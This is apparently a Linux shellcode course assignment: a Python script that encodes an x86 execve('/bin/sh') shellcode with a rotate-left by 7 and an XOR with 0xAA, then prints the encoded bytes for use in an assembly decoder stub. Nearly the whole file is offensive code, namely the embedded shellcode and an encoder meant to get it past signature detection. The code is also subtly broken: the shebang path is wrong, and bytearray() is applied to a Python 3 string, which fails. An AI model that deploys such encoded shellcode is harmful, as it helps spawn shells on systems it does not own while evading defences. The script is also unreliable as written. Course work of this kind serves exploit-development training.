# SLAE Assignment #4: Generate ROT7-XOr Encoded Shellcode
# Website:  http://blog.jsiob.com
# SLAE-ID: 1400



#!/usr/env/python3
from collections import deque

# ROT, XOR shellcode encoder

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")



# rotate to left method
def rol(byte, op):
	new_byte = 0
	new_byte = byte << op
	return (new_byte & 0xff) + (new_byte >> 8)

# intialize variables

encoded_shellcode = ""
encoded_nasm = ""

rotate = 7	
	

for x in bytearray(shellcode) :
	
	# Rotate to left by 7
	y = rol(x, rotate)
	
	# XOR with OxAA 	
	z = y^0xAA
	
		
	# shellcode format with \x
	encoded_shellcode += "\\x"
	encoded_shellcode += '%02x' %z
	

	# shellcode format for pasting in nasm file
	encoded_nasm += "0x"
	encoded_nasm += "%02x," %z


print('Encoded shellcode:')
print(encoded_shellcode)

print('Shellcode for nasm:')
print(encoded_nasm)

print('Shellcode Length: %d' % len(bytearray(shellcode)))
